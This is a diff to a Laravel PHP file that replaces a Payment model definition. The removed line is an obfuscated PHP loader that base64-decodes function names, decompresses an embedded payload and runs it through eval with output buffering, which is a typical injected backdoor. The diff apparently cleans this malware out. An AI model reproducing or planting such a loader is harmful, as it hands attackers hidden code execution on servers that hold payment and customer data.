@@ -1,1 +1,28 @@
-<?php $_='f07fd287';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNqFU01zmzAQvfdXcMgM9kwPfMSdMB4fDIlk45bUOEZCl4wl+VsQphjb8Ou7GKdx4rRlZkFon97uPu1qWvPcPL89PV1Y3Lzr8LnevWk2sl/rdLfQu1+0C3xP06np7DmJ0njc6+nam/uVrwdLXSSRIalfDD1XyQTlIy9cUPMuezzUh7T3pM+adjrEZ/n82+2znIsXCXlcpXg/fgm8pLOC6JXAaMMmrisGrngizpaRY/V4MEb348wU1nQ5IcdcEjPjCTJYdHyIabiKE1TBGnHsHCWJComOOCaBwW0/YzQQE4yqMEEbiZ1y/pQHXhpVEMPn+GhyogrgUPQhXEmM1jENYB3l3EYmIx2DPph7hqP8nMOGA5co3XFM1a72D3F0K3FUsMGPZZPvAfghxrq/BJGanD/GXxqjoQf+gVtyO1QxGPP6W5aoHPjXHE+XPycuB12WJ9zJpCESVAir5lF7rhxjTl3ll4dzrMZ8Oyxj0qnq+mfEKailtv/F2GHGyTT93j/n1VgaE3Mvocar85YPdakCtK2oHbyAzga1AtDpE466JuSUjDAFzVPE1jVmRjoWt9SGRU4Bd7tmdHiFgRgphdpjyzF5Gi7gznOoAXpF5B91mmFVMuQcYuob88hpdDOdjHlX2MMMO8W/4sKdlMIOF9Bvu09i7WYk3HIc/c2fQz+BNnVvX9cNvCs5iKo3fV1Z99libIwu5vNiBE/f1vmvfZroi7129xV52mzp9Vv/+gf+fjjPPK3LWWy3u78BpIZU7A=='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Model;
+
+class Payment extends Model
+{
+    use HasFactory;
+
+    protected $fillable = [
+        'transaction_type',
+        'transaction_id',
+        'transaction_time',
+        'amount',
+        'business_short_code',
+        'bill_reference',
+        'invoice_number',
+        'org_account_balance',
+        'third_party_trans_id',
+        'phone_number',
+        'first_name',
+        'middle_name',
+        'last_name',
+        'status',
+    ];
+}
